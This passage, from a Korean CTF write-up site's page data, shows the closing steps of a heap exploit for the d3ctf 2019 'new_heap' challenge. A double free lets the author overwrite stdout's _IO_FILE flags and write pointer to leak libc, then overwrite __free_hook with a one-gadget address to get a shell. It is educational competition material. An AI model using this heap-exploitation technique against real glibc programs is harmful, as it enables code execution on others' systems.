url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAADHElEQVQ4y22U2ZKcOBBF6zdm3M1SgNjXArEIJJBAiLWquqfHDv//h0xQ5Ziw247Ih3w5efPeSOnEsqRPfGQ5EF7yJq8JqtuyxHnFWIo6xYplK1LMQDFDWbc0w9J1S9Mty7CBYZ/8GFYNTfPaDlKIuooMEHWy7pxN7wwcWTMVw5J18yjNkg1bMRwFOJJhSbp1knSLjesw73y5NpRjype3fzs+be9fMRthibthTotmmPa2n+tuQJimZePF2esZnFTgtv1EesHE1nQ8KRBfb8OyX//5ttw+IDrgErOWCb7cUDvQYcrrNquwpJkHzPgi1jubtn7aLkVNxdbP67Td7x/fISKYCUzHhvL19tF0vB+XS9HkDVWBfVKA0w1Tx2fSi4qwtGz4euvn7fr+dbl9JLCifC4aiunYT3tF2EO5S0ssaeCkAHd4aA7LFRFWUy72ezuI/f1b3Q0lpsdQTKf9nfTTMahuvRjqtn8EpgCn7QVmI6Yj6UVS1HRco6w4m+6PAs7ZdDXLUx+NCmxZtyXNlHXr8NyLbdrfx+XGl1uJu6Jpddt/UfRX1Xg9gxfVeFENSQOSZkma+cSedSiTfsKMh1nRjUtFWARRDCsvSuOscsJLlJX+JddtX/4J+x92mVj5vKclFtvdCRLTi53wotue6Ua67dtBYgWJZnmfyB/KqO3puCLSZxXOKhKkRZSVcY7ivAqzQtbM1zN4HNlvsHoENrFpE9tb0w5UrLgfTe/Q1B1fs7ynz9czkP6wtnF4ZmJF7QARgYjEsDK9SDFszfKAGxpuYDiB6UVn0/0D3PEZs7EiPV9vYr9P+xsTaztMmA4xRF6cOeElhpVh+9Kx/69rk2Ea5muSo4aNsCZ2mARpHueVFcSG49t+Yvmx6cXACRTD/hwY5fMw7ZiJoqHtMIvtHsPyUtR2kAQXmOQozqooq9wwVYHzeW3MBJ+vhAnSCydMkhz9Jal/y9oXxfii6M/m5XEwnz0f71nsbT81jI/rrRvnKM0NJ3hGZXoRcEMVOMrxDdifYeBGSY7SEj+MRRARJ0qLhsaweuSEsrJRf8Oe8H/evfFGlkHi0wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png\"\n        srcset=\"/static/dfec5074f1609d93b8deaeec6076a1f4/e9ff0/11.png 180w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/f21e7/11.png 360w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png 513w\"\n        sizes=\"(max-width: 513px) 100vw, 513px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>_IO_FILE 구조체의 stdout을 확인해 보면 우리가 변조해야 할 부분은 <code class=\"language-text\">_flags</code>, <code class=\"language-text\">_IO_write_base</code> 이다.</li>\n<li>기존의 stdout flags 값은 <code class=\"language-text\">0xfbad2887</code> , <code class=\"language-text\">_IO_IS_APPENDING</code> 플래그가 존재하지 않기 때문에 <code class=\"language-text\">0xfbad2887 | 0x1000</code> 값으로 조작하자</li>\n<li><code class=\"language-text\">_IO_write_base</code> 값의 하위 바이트를 <code class=\"language-text\">\\x20</code> 으로 조작해 라이브러리 주소를 출력 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1887</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x20\"</span><span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> <span class=\"token function\">uu64</span><span class=\"token punctuation\">(</span><span class=\"token function\">r</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3eb780</span>\none_shot <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x4f3c2</span>\nfree_hook <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x3ed8e8</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one_shot \"</span><span class=\"token punctuation\">,</span>one_shot<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"free_hook\"</span><span class=\"token punctuation\">,</span>free_hook<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABhUlEQVQoz5XR227UMBAG4H0QtDn4OPbYju1kk2ySJs522aqogKjoBWoLvP9LIApC3RYhIf2am5lPM9Jsbm/vpuVtVY3a1IGIQGVg0DJwTzVSCWBLYQuOVBgi9JaIjMpf2Xz68jDNq5YoJTpdKYmUSEGBUSmo5EQIMCXXGYOCqYLBH/kTf7j5mE437XDshuTawSqHVHgqFZWeSsOAcp1xLJguuSq52j7H69W7EHaOKMN0pDJS4TkGYZGrKLBhoABLYXNuqTT0xdl3D9/SfFlD41ScwSYOrXS1bg24xvjElNWWgC+kZ8pzMOf4/uuUTtQkgl0Z2pHjTtig9gg+oj8QsNrlEP6OP98/zuO6UD1KXJVJXO9Bh6oBXVUh9goNOga+hMAxvtr8+H2aD62uootdN/UuutCEtOpd7/cDQ6utj/2C9ei7CwZ4hpfDVTel+XR9ef3e1t2WypxB8dTLichKkTHIGOTnT/qNj8uxGZb+Yq27Eavm9cQ/stnVnbQBbMwZvCnYf+Ef6sFyZN467kAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png\"\n        srcset=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/e9ff0/12.png 180w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/f21e7/12.png 360w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png 720w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/efc66/12.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>라이브러리 주소를 획득할 수 있다.</li>\n</ul>\n<h2 id=\"shell\" style=\"position:relative;\"><a href=\"#shell\" aria-label=\"shell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>shell!</h2>\n<ul>\n<li>Double Free Bug를 통해 __free_hook에 할당을 한 후 oneshot 가젯 주소로 조작한다.</li>\n<li>free 함수를 호출하여 쉘을 획득 할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'A'</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>one_shot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 702px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABGUlEQVQoz43O6WqEMBQF4DxIR8clJjGbiVvUaHR0NjpIGUr7/m9SKLR/OkyF8+fA/Q4XNCz7WO/Xt3dZdnkzBUTtCEsQ5zH2/wSmcp+wKEn3kPgxBpZln+v9tN65rnXd87yFVAQRjh/hEFEfpgEk++8KQkiMndxyQVR6MYoQDSDxYuQ9wl6E/Bj9VsAx7drBHa9U5gmVPxd4S8BR6HM7qKbPCqNry1UZwHQrnpm8DbMZF6GrrGxSob0I7cJkEzZ549yiTc9VpaqOyoLIHHO15XnwWltnrDJW6EpXLeYqJiJC7CWAuzB5PgHGVKzj0Z1vxrp+PjfDzLKCcEWzgggdYfbEg4Nb7OFU28mOS+vm1s2dW/rpVLbDv/gL5YZkcN0MV2IAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png\"\n        srcset=\"/static/f9aedffc660490664fdf82d881bd8f5b/e9ff0/13.png 180w,\n/static/f9aedffc660490664fdf82d881bd8f5b/f21e7/13.png 360w,\n/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png 702w\"\n        sizes=\"(max-width: 702px) 100vw, 702px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\">보호 기법</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#alloc\">alloc</a></li>\n<li><a href=\"#free\">free</a></li>\n<li><a href=\"#memory-leak-idea\">memory leak Idea</a></li>\n<li><a href=\"#_io_file_stdout\">_IO_FILE_stdout</a></li>\n<li><a href=\"#stdout\">stdout</a></li>\n<li><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\">_IO_new_file_xsputn 함수</a></li>\n<li><a href=\"#new_do_write-%ED%95%A8%EC%88%98\">new_do_write 함수</a></li>\n<li><a href=\"#how-to-exploit-using-stdout\">How to exploit using stdout</a></li>\n<li><a href=\"#double-free-bug\">Double Free Bug</a></li>\n<li><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\">Fake chunk 구성</a></li>\n<li><a href=\"#how-to-free\">How to Free?</a></li>\n<li><a href=\"#free-fake-chunk\">Free Fake chunk</a></li>\n<li><a href=\"#point-to-stdout\">point to stdout</a></li>\n<li><a href=\"#overwrite-stdout-struct\">Overwrite Stdout Struct</a></li>\n<li><a href=\"#shell\">shell!</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"d3ctf 2019 new_heap 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍣"},"fields":{"slug":"/d3ctf2019_new_heap_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/defcon2016_xkcd_ctf_writeup/","nextSlug":"/defcon2016_feedme_ctf_writeup/","prevSlug":"/d3ctf2019_new_heap_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}